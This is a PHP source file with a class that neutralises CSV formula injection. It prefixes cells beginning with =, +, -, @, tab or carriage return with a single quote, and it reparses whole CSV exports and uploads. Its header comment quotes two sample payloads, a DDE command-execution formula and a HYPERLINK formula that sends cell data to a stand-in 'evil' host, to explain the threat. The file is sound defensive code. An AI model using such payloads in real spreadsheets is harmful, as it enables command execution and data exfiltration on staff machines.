<?php

declare(strict_types=1);

namespace App\API\Includes;

/**
 * CSV formula-injection guard.
 *
 * Spreadsheet applications evaluate any cell that begins with =, +, -, @,
 * a tab or a carriage return as a formula. A value such as
 * =cmd|'/c calc'!A0 or =HYPERLINK("https://evil/?"&A1) executes or exfiltrates
 * when staff open an exported or uploaded CSV in Excel/LibreOffice.
 *
 * The standard mitigation is to prefix such cells with a single quote, which
 * spreadsheet apps treat as a "this is text" marker and do not display.
 */
final class CsvSafety
{
    /** Characters that make a spreadsheet treat the cell as a formula. */
    private const FORMULA_LEAD = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Neutralise one cell value. Numbers and ordinary text pass through
     * unchanged; only formula-leading values gain the text marker.
     */
    public static function cell(mixed $value): string
    {
        $text = (string) $value;
        if ($text === '' || is_numeric($text)) {
            // Plain numbers (including negatives) are stored as numbers by
            // spreadsheet apps and can never be evaluated as formulas.
            return $text;
        }
        if (in_array($text[0], self::FORMULA_LEAD, true)) {
            return "'" . $text;
        }
        return $text;
    }

    /** Neutralise every cell of one record. */
    public static function row(array $row): array
    {
        return array_map(static fn ($value) => self::cell($value), $row);
    }

    /**
     * Neutralise a complete CSV document produced elsewhere (for example the
     * browser-built exports POSTed to /api/download/export, or a CSV uploaded
     * by a user and later served back). The document is parsed and rewritten
     * so quoted fields containing commas/newlines survive intact.
     */
    public static function content(string $csv): string
    {
        if ($csv === '') {
            return $csv;
        }
        $input = fopen('php://temp', 'r+');
        $output = fopen('php://temp', 'r+');
        if ($input === false || $output === false) {
            if (is_resource($input)) {
                fclose($input);
            }
            if (is_resource($output)) {
                fclose($output);
            }
            return $csv;
        }
        fwrite($input, $csv);
        rewind($input);
        while (($fields = fgetcsv($input, 0, ',', '"', '\\')) !== false) {
            fputcsv($output, self::row($fields), ',', '"', '\\');
        }
        rewind($output);
        $sanitised = stream_get_contents($output);
        fclose($input);
        fclose($output);
        return $sanitised === false ? $csv : $sanitised;
    }
}
